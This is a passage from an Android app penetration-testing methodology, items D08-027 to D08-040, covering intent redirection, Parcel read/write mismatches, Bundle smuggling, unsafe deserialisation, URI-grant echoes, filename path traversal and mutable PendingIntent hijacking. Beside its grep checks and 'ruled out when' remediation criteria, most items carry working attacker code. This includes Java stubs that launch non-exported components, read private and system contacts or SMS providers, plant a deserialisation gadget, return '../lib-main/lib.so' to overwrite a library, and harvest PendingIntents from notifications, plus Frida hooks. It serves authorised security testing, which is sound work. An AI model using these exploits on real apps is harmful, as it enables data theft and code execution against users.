  evil.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
  evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  Parcel p = Parcel.obtain(); p.writeParcelable(evil, 0);
  Log.i("D08", Base64.encodeToString(p.marshall(), Base64.NO_WRAP));
  ```
  ```bash
  adb shell am start -a android.intent.action.VIEW -d 'myapp://handle/?param=<BASE64>'
  ```
- **Proof:** A browser-triggerable deep link whose base64 parameter unmarshals to an `Intent` targeting a
  non-exported component, and that component launching — `dumpsys activity activities` plus a screenshot.
- **Escalation:** → D16/D17: a malformed `Parcelable` in the same stream is a memory-corruption and
  type-confusion surface, not just a redirection one (see D08-028 and D08-029).
- **Ruled out when:** No `unmarshall(` appears outside framework packages, or the unmarshalled object is
  read with the typed `readParcelable(ClassLoader, Class<T>)` overload **and** the resulting Intent is
  rebuilt from an allow-list rather than launched.

### D08-028 · Untyped `getParcelableExtra` / `getParcelable` / `getSerializableExtra`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | typed overloads exist from **API 33** (Android 13); LEGACY below that — say so explicitly rather than reporting a pre-33 app for not using an API that did not exist |
| **Maps to** | `risks/unsafe-deserialization` — use `Intent.getParcelableExtra(String, Class<T>)`, `Intent.getParcelableArrayListExtra(String, Class<? extends T>)`, `Parcel.readParcelable(ClassLoader, Class<T>)` on API 33+; "catches type mismatches before deserialization, preventing privilege escalation (e.g. CVE-2021-0928)"; michalbednarski/TheLastBundleMismatch — **CVE-2023-45777**, the patch "adds the type parameter to the original call"; MASWE-0050 (CWE-502, CWE-501) |

- **Test:** The legacy untyped overloads instantiate whatever class the Parcel names, using the supplied
  `ClassLoader`, *before* any type check. The typed overloads validate first. On a modern target the
  untyped form keeps the type-confusion surface open, and it is the exact gap CVE-2023-45777 exploited
  against `AccountManagerService.checkKeyIntent()` via `bundle.getParcelable(KEY_INTENT)`.
- **How:**
  ```bash
  grep -rnE 'getParcelableExtra\(\s*[^,)]+\s*\)|getParcelable\(\s*[^,)]+\s*\)|getParcelableArrayList(Extra)?\(\s*[^,)]+\s*\)|getSerializable(Extra)?\(\s*[^,)]+\s*\)|readParcelable\(\s*[^,)]+\s*\)' out/sources/
  # the safe forms name a class:
  grep -rnE 'getParcelable\([^,]+,\s*[A-Za-z.]+::class\.java|IntentCompat\.getParcelableExtra|BundleCompat\.getParcelable|getParcelableExtra\([^,]+,\s*[A-Za-z.]+\.class' out/sources/
  grep -rn 'setClassLoader(\|BadParcelableException' out/sources/
  ```
- **Proof:** Untyped call sites on a Bundle or Intent that originated from an exported component, a
  notification, a widget fill-in or a Wear message — plus a crafted Intent carrying a different Parcelable
  type for that key producing `ClassCastException`/`BadParcelableException` in the target. That exception is
  evidence the class is instantiated *before* the type check.
- **Escalation:** Medium standalone; High when combined with D08-029 (a mismatched class) or when the
  crafted type reaches a class whose `createFromParcel` has side effects. Note the platform lesson from
  CVE-2023-45777: even a typed check helps only if it is applied before the value is used.
- **Ruled out when:** Every read of externally sourced Parcelable/Serializable data uses the typed overload
  or `IntentCompat`/`BundleCompat`, or `minSdkVersion` is below 33 **and** the app additionally validates
  `instanceof` before use — record which.

### D08-029 · App-defined `Parcelable` whose write and read byte counts disagree

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the smuggled value defeats an auth check |
| **Attacker** | AM-03 |
| **Applies to** | all; Android 13's length-prefixed `LazyValue` limits *cascading* corruption but, per CVE-2023-45777, does not save code that deserialises without a type |
| **Maps to** | michalbednarski/ReparcelBug2 — **CVE-2021-0928** (`OutputConfiguration` write/read mismatch) with its four detection signs; michalbednarski/LeakValue — **CVE-2022-20452** (LazyValue referencing a recycled Parcel); **CVE-2023-20963** (WorkSource parcel/unparcel mismatch, exploited in the wild per Project Zero's RCA); **CVE-2024-49744**; Bundle Fengshui (Bundle magic `0x4C444E42`, length-prefixed lazy unparcel, AccountManagerService→Settings uid 1000 `launchAnyWhere`, CVE-2017-0806, CVE-2021-0748); `risks/unsafe-deserialization` (CWE-502, CWE-501) |

- **Test:** A `Parcelable` whose `writeToParcel` and `createFromParcel` do not consume the same number of
  bytes lets an attacker hide extra key/value pairs in a `Bundle`: the validating reader sees a benign
  Bundle, a later reader sees additional keys. Against the framework this is `launchAnyWhere`; inside an
  app it is "the Intent that was validated is not the Intent that gets launched".
- **How:** Static triage — the four warning signs are a `catch` in `createFromParcel` that does not
  rethrow, untyped collections via `readList()` without a `ClassLoader` constraint, nested variable-length
  objects, and mismatched field counts:
  ```bash
  grep -rln 'implements Parcelable\|: Parcelable' out/sources/ | while read -r f; do
    w=$(sed -n '/writeToParcel/,/^\s*}/p' "$f" | grep -cE 'write[A-Z][A-Za-z]*\(')
    r=$(sed -n '/createFromParcel/,/^\s*}/p;/protected .*(Parcel/,/^\s*}/p' "$f" | grep -cE 'read[A-Z][A-Za-z]*\(')
    [ "$w" != "$r" ] && echo "MISMATCH $f write=$w read=$r"
  done | tee /tmp/d08_parcel_mismatch.txt
  wc -l /tmp/d08_parcel_mismatch.txt          # count — a silent zero is a failed loop
  grep -rn 'createFromParcel' out/sources/ -A25 | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
  ```
  Differential instrumentation:
  ```javascript
  Java.perform(function () {
    var C  = Java.use("com.target.app.model.Thing");
    var CR = Java.use("com.target.app.model.Thing$1");
    C.writeToParcel.implementation = function (p, f) {
      var a = p.dataPosition(); this.writeToParcel(p, f);
      console.log("write delta=" + (p.dataPosition() - a));
    };
    CR.createFromParcel.overload('android.os.Parcel').implementation = function (p) {
      var a = p.dataPosition(); var r = this.createFromParcel(p);
      console.log("read  delta=" + (p.dataPosition() - a)); return r;
    };
  });
  ```
- **Proof:** Unequal write/read deltas for the same object, then a crafted `Bundle` where the validating
  code path logs key set `{a}` while the downstream component logs `{a, injected}`. Print both key sets
  side by side.
- **Escalation:** The app-context payoff is forwarding a forged `Intent` past a check — D08-007 with the
  validation defeated. Generalised rule to test: **any Bundle that is validated in one place and used in
  another**.
- **Ruled out when:** Every app-defined `Parcelable` has matching write/read counts (or a measured zero
  `dataPosition()` drift in the harness), no `createFromParcel` swallows exceptions, and no externally
  sourced Bundle is forwarded after validation.

### D08-030 · Whole-`Bundle` forward carrying smuggled `IBinder` / `PendingIntent` keys

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | AOSP "AIDL overview" (objects packed onto a buffer and copied to the remote process); Bundle Fengshui analysis of AccountManagerService forwarding a Bundle to Settings (uid 1000) which then executed Intents inside it — the `launchAnyWhere` pattern; `risks/unsafe-deserialization` |

- **Test:** A `Bundle` can carry live `IBinder` handles (`putBinder`) and `PendingIntent` objects. An app
  that receives a Bundle from an untrusted source, inspects only the keys it expects, and then forwards the
  **whole Bundle** to a more privileged component is handing over whatever else is inside it — a live
  capability crossing a trust boundary.
- **How:**
  ```bash
  grep -rnE 'getExtras\(\)|putExtras\(|getBundleExtra|putBinder|getBinder' out/sources/ -A8 \
    | grep -B4 -A6 -E 'startActivity|startService|sendBroadcast|\.send\(|bindService'
  ```
  From the stub, craft a Bundle with unexpected keys:
  ```java
  Bundle b = new Bundle();
  b.putString("expected_key", "benign");
  b.putBinder("smuggled_binder", myLiveBinder);
  b.putParcelable("smuggled_pi", myPendingIntent);
  b.putParcelable("android.intent.extra.INTENT", innerEvilIntent);
  outer.putExtras(b);
  ```
  Then hook the downstream component:
  ```javascript
  Java.perform(function () {
    var A = Java.use('com.target.app.internal.Privileged');
    A.onCreate.overload('android.os.Bundle').implementation = function (s) {
      var i = this.getIntent();
      console.log('keys=' + i.getExtras().keySet().toString());
      console.log('binder=' + i.getExtras().getBinder('smuggled_binder'));
      return this.onCreate(s);
    };
  });
  ```
- **Proof:** The Frida hook on the downstream component printing your smuggled key and a non-null
  `getBinder()` — a live capability transferred across the boundary the app believed it was policing.
- **Escalation:** → D06 (you now hold a binder into a privileged component); → D08-029 (the same forwarding
  path is the precondition for the Parcel-mismatch attack); → D08-037 if a `PendingIntent` rode along.
- **Ruled out when:** Every forward constructs a fresh `Bundle`/`Intent` and copies only named keys of
  known types, and no `putExtras(Bundle)` or `putExtras(Intent)` appears on a path whose source is
  external.

### D08-031 · Parcel mismatch across the app's own `android:process` boundary

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | any app declaring `android:process` or using multiprocess WorkManager |
| **Maps to** | michalbednarski/ReparcelBug2 (**CVE-2021-0928**) and TheLastBundleMismatch (**CVE-2023-45777**) applied to an app's own IPC rather than the framework's |

- **Test:** The mismatch class exists because data is validated in one process and re-serialised to
  another. An app with its own process boundary reproduces the system's exact conditions — and nobody
  reviews the app's internal IPC for it.
- **How:**
  ```bash
  grep -n 'android:process' out/AndroidManifest.merged.xml
  grep -rn 'androidx.work.multiprocess\|RemoteListenableWorker\|RemoteWorkManager' out/sources/ out/AndroidManifest.merged.xml
  grep -rln 'implements Parcelable' out/sources/ | xargs grep -ln 'catch'
  ```
  Then instrument both sides of the boundary and compare the decoded object.
- **Proof:** A `Bundle` that validates in the entry process but decodes to a different object in the worker
  process — `Parcel.dataPosition()` drift plus a differing `getClass()` on each side, printed from both
  processes.
- **Escalation:** Validation bypass across the app's own trust boundary, then D08-007 with the check
  defeated.
- **Ruled out when:** The manifest declares no `android:process` and no multiprocess WorkManager, so there
  is no in-app re-serialisation boundary for the mismatch to cross.

### D08-032 · Untyped `getSerializableExtra` on an exported forwarder

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); with a demonstrated gadget, `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | `targetSdk < 33` is where the untyped getters are the default idiom; from API 33 the typed `getSerializableExtra(String, Class)` exists and its absence at a hit is the finding |
| **Maps to** | `risks/unsafe-deserialization` (CVE-2014-7911 `ObjectInputStream`/Android < 5.0, look-ahead `ObjectInputFilter` mitigation); rule `mastg-android-object-deserialization`; MASWE-0050 (CWE-502) |

- **Test:** An exported component that deserialises an object it does not type-check instantiates
  attacker-chosen classes from the app's own classpath, and `readObject()` overrides in the app's or its
  dependencies' classes run as side effects. In this domain it matters because the deserialised object is
  frequently the thing that drives the forward.
- **How:**
  ```bash
  grep -rnE 'getSerializableExtra\(|readSerializable\(|ObjectInputStream|readObject\(' out/sources/ | grep -v test
  grep -rn 'implements Serializable' out/sources/ | wc -l
  grep -rn -A10 'private void readObject' out/sources/       # gadget candidates inside the app
  grep -rn 'setObjectInputFilter' out/sources/               # the mitigation; absence is the gap
  ```
  Build the payload by loading the target's own `classes.dex` in the stub:
  ```java
  DexClassLoader dcl = new DexClassLoader(targetApkPath, getCacheDir().getAbsolutePath(), null, getClassLoader());
  Class<?> g = dcl.loadClass("com.target.app.SomeGadget");
  Object o = g.newInstance();
  Field f = g.getDeclaredField("path"); f.setAccessible(true);
  f.set(o, "/data/data/com.target.app/files/pwn");
  Intent i = new Intent().setClassName("com.target.app", "com.target.app.ExportedActivity");
  i.putExtra("so", (Serializable) o);
  startActivity(i);
  ```
- **Proof:** The gadget's `readObject()` side effect observable — a file created at the path you set
  (`adb shell run-as com.target.app ls -l files/` on a debuggable build), or logic executing on
  attacker-chosen field values. A `ClassCastException` in logcat proves the object was instantiated before
  the type check.
- **Escalation:** → D17 for the gadget hunt and the write→code-load chain. Report RCE only with a
  demonstrated gadget; otherwise state "logic forgery" and keep it at Medium.
- **Ruled out when:** Every `getSerializableExtra` uses the typed overload, or no exported component
  deserialises at all, or the app ships an `ObjectInputFilter` allow-list on the path.

### D08-033 · `setResult(RESULT_OK, getIntent())` — the full-Intent echo

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the read file yields an API token; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all. `android:grantUriPermissions="true"` on a non-exported provider is what makes the victim's **own** providers reachable this way; the `<provider>` default for that attribute is `"false"` |
| **Maps to** | Oversecured "Gaining access to arbitrary Content Providers" — the four vectors (direct intent return, implicit-intent interception with `priority="999"`, `onActivityResult` substitution, permission capture via a `READ_CONTACTS`-holding app) and the remediation line "Developers should never redirect Intents in full"; H1 #272044 (Dropbox, "Android - Access of some not exported content providers", $1000); MASTG-KNOW-0117; CWE-926 |

- **Test:** An exported activity that returns the incoming Intent as its result also returns the URI grants
  that Intent carried, backed by the target's authority. This is the cheapest Critical in the chapter: one
  grep, one `startActivityForResult`, and it bypasses `exported="false"` on providers entirely without
  needing a nested-intent forwarder anywhere in the app. The minimal vulnerable shape:
  ```java
  protected void onCreate(Bundle b) { setResult(-1, getIntent()); finish(); }
  ```
- **How:**
  ```bash
  grep -rnE 'setResult\([^,)]*,\s*getIntent\(\)\)|setResult\(-1,\s*getIntent\(\)\)|setResult\([^,)]*,\s*intent\)' out/sources/
  grep -rn 'setResult(' out/sources/ -B4 -A4 | grep -nE 'getParcelableExtra|getData\(\)|FLAG_GRANT'
  ```
  Attacker side:
  ```java
  Intent i = new Intent().setClassName("com.target.app", "com.target.app.EchoActivity");
  i.setData(Uri.parse("content://com.target.app.internal/secrets"));
  i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
           | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
           | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
  startActivityForResult(i, 1);
  // onActivityResult:
  try (InputStream in = getContentResolver().openInputStream(data.getData())) { /* dump */ }
  ```
- **Proof:** `getContentResolver().query(returnedUri, …)` (or `openInputStream`) succeeding in your process
  where the identical call fails without the round trip. That delta is the whole finding — show both, and
  show `dumpsys activity providers | grep -A5 UriPermission` listing your package.
- **Escalation:** D08-034 for the system-provider variant; D08-012 to make it persistent; → D07 for what
  the provider holds; → D11/D13 once you have the token file.
- **Ruled out when:** No `setResult` receives `getIntent()` or a derivative of it, every result Intent is a
  freshly constructed object carrying only named extras, and `dumpsys activity providers` shows no grant to
  your package after the round trip.

### D08-034 · Echo or redirect aimed at a system provider the victim holds permission for

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null — rated on the data) |
| **Attacker** | AM-03 (the attacker holds **no** runtime permissions) |
| **Applies to** | all apps that hold a dangerous permission — contacts, SMS, call log, calendar, media |
| **Maps to** | Oversecured "Gaining access to arbitrary Content Providers" vector 4 (permission capture via a permission-holding app); ATT&CK T1409 Stored Application Data; `risks/content-resolver` (`belongsToCurrentApplication()`, `isExported()`, `checkUriPermission()` are the documented validators whose absence is the bug) |

- **Test:** The echo and the forward do not only re-delegate the victim's *own* provider access. They
  re-delegate every runtime permission the victim holds, because the grant is computed against the victim's
  UID. Enumerate what the target holds, then aim the primitive at the matching system authority.
- **How:**
  ```bash
  adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
  ```
  Then, through whichever primitive you proved (D08-033 or D08-007):
  ```java
  i.setData(Uri.parse("content://com.android.contacts/data"));          // victim holds READ_CONTACTS
  // or ContactsContract.RawContacts.CONTENT_URI, content://sms, content://call_log/calls
  i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  ```
  Also test the proxy-read direction, where the victim reads for you and renders or uploads the result:
  ```bash
  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.android.contacts/contacts'
  ```
- **Proof:** Rows from a system provider dumped in the attacker process, with the attacker's manifest
  showing **only** `INTERNET`. Log the first few rows (masking the values, keeping the column names — the
  triager needs the JSON/column keys, not the PII). Then `adb shell dumpsys package com.attacker.poc` to
  show no dangerous permission granted.
- **Escalation:** Contacts/SMS/call-log disclosure by a zero-permission app is a privacy P1-class narrative
  on most programmes; → D20 for the privacy framing, → D13 if the SMS provider yields an OTP.
- **Ruled out when:** The target holds no dangerous runtime permission (record `dumpsys package` output),
  or the primitive validates the data URI's authority against `belongsToCurrentApplication()` /
  `isExported()` / `checkUriPermission()` before acting.

### D08-035 · `onActivityResult` trusting a third-party result Intent — the reverse direction

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 + one user tap (the picker/chooser) |
| **Applies to** | all apps that call `ACTION_GET_CONTENT`, `ACTION_OPEN_DOCUMENT`, `ACTION_PICK`, `IMAGE_CAPTURE`, or any share/import flow |
| **Maps to** | MASTG-TEST-0375 (Missing Validation of Data Returned from Implicit Intents), MASWE-0050 (CWE-20, CWE-22, CWE-73, CWE-345), MASTG-KNOW-0138 (URI Schemes in Android Intent Results), MASTG-KNOW-0025, MASTG-BEST-0057, MASTG-TECH-0043 |

- **Test:** Everyone tests the app as a *receiver* of intents. The responder side is the one nobody
  reviews: when the app asks another app for content, the **responder controls** `Intent.getData()`,
  `ClipData`, the extras and any provider metadata the caller then queries. Treating that as trusted is the
  bug, and it runs with the caller's own filesystem identity.
- **How:**
  ```bash
  grep -rn 'startActivityForResult\|ActivityResultLauncher\|registerForActivityResult\|onActivityResult' out/sources/
  grep -rn 'getData()\|getClipData()\|openInputStream\|contentResolver.query\|OpenableColumns.DISPLAY_NAME' out/sources/
  ```
  Register a hostile responder in the stub app with a matching filter and `android:priority="999"`:
  ```xml
  <activity android:name=".Responder" android:exported="true">
    <intent-filter android:priority="999">
      <action android:name="android.intent.action.GET_CONTENT"/>
      <category android:name="android.intent.category.OPENABLE"/>
      <category android:name="android.intent.category.DEFAULT"/>
      <data android:mimeType="*/*"/>
    </intent-filter>
  </activity>
  ```
  ```java
  setResult(-1, new Intent().setData(
      Uri.parse("file:///data/user/0/com.target.app/shared_prefs/auth.xml")));
  finish();
  ```
- **Proof:** The victim reading or uploading that path — the outbound request body in Burp, a Frida trace
  of `openInputStream`, or the copied file found afterwards in `getExternalCacheDir()`. A `content://`
  URI is resolved with the **provider's** identity; a `file://` URI is read with the **caller's own**
  process identity and filesystem permissions, which is why case 1 is a sandbox read.
- **Escalation:** → D11 token theft → D13/D15. See D08-036 for the write-side variant.
- **Ruled out when:** The result handler rejects any scheme other than `content://`, resolves the authority
  and refuses one that is not in an allow-list, and never constructs a local path from responder-supplied
  metadata. `file://` sharing throws `FileUriExposedException` on API 24+ **on the sender's side** — the
  attacker relaxes that with `StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX)` in their own app, so the
  victim's API level does not rule this out.

### D08-036 · Path traversal via `OpenableColumns.DISPLAY_NAME` from a hostile provider

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on a loaded library or DEX; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 + one user tap |
| **Applies to** | all apps that accept shared files |
| **Maps to** | `risks/untrustworthy-contentprovider-provided-filename` — **CWE-73: External Control of Filename or Path**, impact listed as "Malicious code execution — overwrite application executables or DEX files"; MASTG-KNOW-0138 (the `File(dir, name)` → `../lib-main/lib.so` example); MASTG-TEST-0375; MASWE-0050 |

- **Test:** The inverse of the usual provider test, and the single most commonly missed one. The victim
  queries your provider for `OpenableColumns.DISPLAY_NAME` to name the file it is about to write. You
  return `../../lib-main/lib.so` and `new File(context.getFilesDir(), name)` resolves it normally — an
  arbitrary write inside the victim's sandbox.
- **How:**
  ```bash
  grep -rnE 'OpenableColumns|DISPLAY_NAME|getColumnIndex\(.*DISPLAY_NAME' out/sources/
  grep -rn 'new File(' out/sources/ | grep -iE 'displayname|filename|name'
  grep -rn 'getCanonicalPath\(\)\.startsWith' out/sources/     # the fix; absence is the bug
  ```
  In the stub provider's `query()`:
  ```java
  MatrixCursor c = new MatrixCursor(new String[]{OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE});
  c.addRow(new Object[]{"../lib-main/lib.so", payload.length});
  return c;
  ```
- **Proof:** After the share, `adb shell run-as com.target.app ls -l files/ lib-main/` (debuggable build)
  showing your file at the traversed path, or a behaviour change proving the overwritten file took effect.
  The control: a benign `DISPLAY_NAME` writes to the expected directory.
- **Escalation:** → D17: overwrite a `.dex`/`.jar`/`.so` the app later loads → persistent code execution as
  the victim. Match the write destination against the load source:
  ```bash
  grep -rn 'DexClassLoader\|PathClassLoader\|System.load(\|System.loadLibrary(\|createPackageContext' out/sources/
  grep -rn 'getDir(\|getFilesDir()\|getCodeCacheDir()\|nativeLibraryDir' out/sources/
  ```
  If no code-load path consumes the writable directory, keep the base severity and state the ceiling
  separately: "High; ceiling = RCE **if** a writable code-load path exists — not shown."
- **Ruled out when:** The app canonicalises and prefix-checks
  (`getCanonicalPath().startsWith(targetDir.getCanonicalPath() + File.separator)`) before writing, or
  discards `DISPLAY_NAME` entirely and generates its own filename.

### D08-037 · Mutable `PendingIntent` with a blank or implicit base Intent

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) or `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the fired action is authenticated |
| **Attacker** | AM-03; AM-04 when acquisition needs the notification-listener grant (D08-040) |
| **Applies to** | **LEGACY default:** below API 31 `PendingIntent` objects were mutable by default, so an omitted flags argument is the vulnerable case. From targetSdk 31 mutability must be declared explicitly or creation throws `IllegalArgumentException` — so on a modern target an explicit `FLAG_MUTABLE` is the thing to hunt, and it is a deliberate developer choice |
| **Maps to** | MASTG-TEST-0381 (References to Insecure PendingIntent Creation), MASTG-KNOW-0024, MASTG-BEST-0063, rule `mastg-android-pendingintent-mutable`, MASTG-TEST-0030 (deprecated predecessor, source of the Frida hook); MASWE-0032 (CWE-927, CWE-940); **CVE-2020-0389 / A-156959408** (base intent implicit *and* PendingIntent mutable); `risks/pending-intent`; Google Play ASI "Implicit PendingIntent" campaign (2022-02-22); mindedsecurity `MSTG-PLATFORM-4_1`; QARK `implicit_intent_to_pending_intent.py`; Google Mobile VRP "Vulnerabilities caused by unsafe usage of pending intents" |

- **Test:** AOSP's own javadoc: "By giving a PendingIntent to another application, you are granting it the
  right to perform the operation you have specified as if the other application was yourself (with the same
  permissions and identity)." Mutable means the holder can `fillIn()` the unset fields; an implicit or
  blank base intent means the *component* is one of them. Together that is arbitrary component invocation
  as the victim.
- **How:**
  ```bash
  semgrep --config rules/mastg-android-pendingintent-mutable.yml out/sources/
  # the rule flags a flags argument of: 0, 134217728 (FLAG_UPDATE_CURRENT), 33554432 (FLAG_MUTABLE),
  # 0x08000000, 0x02000000, PendingIntent.FLAG_UPDATE_CURRENT, PendingIntent.FLAG_MUTABLE
  grep -rnE 'PendingIntent\.(getActivity|getActivities|getBroadcast|getService|getForegroundService)\s*\(' out/sources/ -A4 \
    | grep -vE 'FLAG_IMMUTABLE'
  # for each hit read the base Intent construction — the dangerous shape is new Intent() with no component
  grep -rn -B8 'PendingIntent.get' out/sources/ | grep -E 'new Intent\(|setClass|setComponent|setClassName|setPackage'
  grep -rn 'FLAG_MUTABLE\|FLAG_IMMUTABLE\|FLAG_ONE_SHOT\|FLAG_UPDATE_CURRENT\|FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' out/sources/
  ```
  Flag values for a smali/obfuscated read: `FLAG_MUTABLE 0x02000000` (33554432),
  `FLAG_IMMUTABLE 0x04000000` (67108864), `FLAG_UPDATE_CURRENT 0x08000000` (134217728),
  `FLAG_ONE_SHOT 0x40000000`. Build-log tell: lint `UnspecifiedImmutableFlag`.
  Exploit once you hold the token:
  ```java
  Intent fill = new Intent();
  fill.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
  fill.setData(Uri.parse("content://com.target.app.internalprovider/secrets"));
  fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  pi.send(context, 0, fill);            // executes with the VICTIM's identity
  ```
- **Proof:** The victim's non-exported component starting — `dumpsys activity activities` naming it as
  resumed while a direct `am start -n` on the same component is refused with `Permission Denial` — and
  `Binder.getCallingUid()` inside it reporting the **victim's** uid, not yours (hook it with Frida so the
  confused deputy is explicit). Pair with the D08-003 census line showing `immutable=false` and no `cmp=`.
- **Escalation:** → D08-052 to make the send issue a URI grant; → D06 to start a permission-protected
  service; → D15 to perform a backend action as the victim.
- **Ruled out when:** Every `PendingIntent.get*` call passes `FLAG_IMMUTABLE`, **or** passes `FLAG_MUTABLE`
  with a base intent that sets an explicit `ComponentName` and whose remaining fillable fields (data,
  extras) are unused by the target component. Check the base intent, never the flag alone. Note the
  legitimate exception: inline reply genuinely requires mutability (D08-044).

### D08-038 · Mutable `PendingIntent` with `setPackage()` only — the targetSdk-34-compliant variant

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
| **Attacker** | AM-03, AM-04 |
| **Applies to** | targetSdk 34+ |
| **Maps to** | `about/versions/14/behavior-changes-14` — "Mutable pending intents with unspecified component/package throw an exception"; the documented "SUCCEEDS" example is `setPackage(context.packageName)`; `risks/pending-intent`; compat change `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` (id `236704164L`) |

- **Test:** Android 14's check is satisfied by a package alone. That narrows your target set to the
  victim's own components — which is exactly the set you wanted, because it includes every non-exported
  one. Do not read the Android 14 hardening as a closure of the class; read it as a hint about which
  payload shape to build.
- **How:**
  ```bash
  grep -rn -B2 -A6 'FLAG_MUTABLE' out/sources/ | grep -n 'setPackage('
  # negative tell: the exception when the app got it wrong
  adb logcat | grep -iE 'IllegalArgumentException.*PendingIntent'
  ```
  The injected `ComponentName` must be inside the victim package:
  ```java
  pi.send(ctx, 0, new Intent().setClassName("com.target.app", "com.target.app.internal.AdminActivity"));
  ```
- **Proof:** The victim's non-exported internal activity/receiver starting from your `send()`. Use this
  item as a **rule-in**: if the app targets 34+ and still ships a mutable PendingIntent, it necessarily has
  a component or package set, so your attack is the fill-in-the-remaining-fields variant, not full
  retargeting. Saying that in the report shows you understand the platform and pre-empts the vendor's first
  objection.
- **Escalation:** As D08-037.
- **Ruled out when:** Every mutable PendingIntent sets a full `ComponentName` **and** the named component
  ignores the fillable fields (no use of `getData()`, `getExtras()` or `getAction()` from the delivered
  intent). Confirm by reading the component, not the builder.

### D08-039 · `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT` present

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk 34+ (Android 14) |
| **Maps to** | `about/versions/14/behavior-changes-14`; `risks/pending-intent`; compat change `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` (id `236704164L`) blocks creating a mutable PendingIntent wrapping an implicit intent for apps targeting U/API 34+ |

- **Test:** Android 14 blocks the mutable-plus-implicit combination. `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT`
  is the documented opt-out. Any app that sets it has told you, in code, that it is knowingly shipping the
  exact shape the platform blocks — treat it as a priority target.
- **How:**
  ```bash
  grep -rn 'FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' out/sources/ out/smali*/
  adb shell am compat enable BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT com.target.app   # debuggable build
  adb logcat | grep -iE 'IllegalArgumentException.*PendingIntent|BLOCK_MUTABLE_IMPLICIT'
  ```
- **Proof:** The call site plus the D08-037 exploitation of that specific PendingIntent. Its presence alone
  is a finding worth stating, but do not file it alone — file it as the lede of the redirection report, the
  same way you do with `removeLaunchSecurityProtection()`.
- **Escalation:** As D08-037.
- **Ruled out when:** The flag appears nowhere in `sources/` or `smali*/`, and enabling
  `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` produces no `IllegalArgumentException` while the app is driven
  through every notification, widget and alarm path.

### D08-040 · PendingIntent harvested from a notification by a `NotificationListenerService`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
| **Attacker** | AM-04 (needs the user to enable the listener — state the precondition explicitly) |
| **Applies to** | all |
| **Maps to** | MASTG-KNOW-0024 — "a malicious application with `android.permission.BIND_NOTIFICATION_LISTENER_SERVICE` can bind to the notification listener service and retrieve the pending intent"; MASTG-TEST-0381, MASTG-TEST-0315; `risks/sender-of-pending-intents` (names `NotificationListenerService` as *the* acquisition vector); ATT&CK T1517 Access Notifications; H1 #1161401 (Nextcloud, Low 1.3, $250 — the "Download complete" notification's implicit PendingIntent, re-sent with `packageName` and `clipData` set, inheriting `com.nextcloud.client`'s CONTACTS permission) |

- **Test:** The acquisition half. A mutable PendingIntent is only a finding if you can reach it. The
  notification drawer is the most reliable route and needs one user grant — which banking trojans routinely
  obtain, so it is a realistic precondition, not a theoretical one.
- **How:**
  ```bash
  grep -rn 'setContentIntent\|addAction\|NotificationCompat.Builder\|Notification.Builder' out/sources/
  adb shell dumpsys notification --noredact | grep -iE 'pkg=com.target.app' -A12
  adb shell cmd notification allow_listener com.attacker.poc/.Listener
  ```
  In the stub listener:
  ```java
  public void onNotificationPosted(StatusBarNotification sbn) {
    Notification n = sbn.getNotification();
    PendingIntent pi = n.contentIntent;                       // or n.actions[i].actionIntent
    Log.i("D08", sbn.getPackageName() + " creator=" + pi.getCreatorPackage());
    Intent fill = new Intent();
    fill.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
